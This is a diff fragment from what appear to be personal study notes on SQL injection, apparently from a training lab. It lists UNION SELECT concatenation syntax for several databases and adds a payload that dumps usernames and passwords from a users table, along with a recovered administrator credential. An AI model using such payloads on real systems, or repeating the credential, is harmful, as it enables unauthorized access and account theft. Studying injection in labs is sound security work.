@@ -67,3 +67,6 @@ Rule:
           "     "       " , username + password from users -- > microsoft
           "      "      " , username  password from users -- > mysql
                              concat(username,password)
+
+      Found username and password: Gifts' union select null, username || '~' || password from users--
+            administrator~z5wp402vuidu2y59oaai
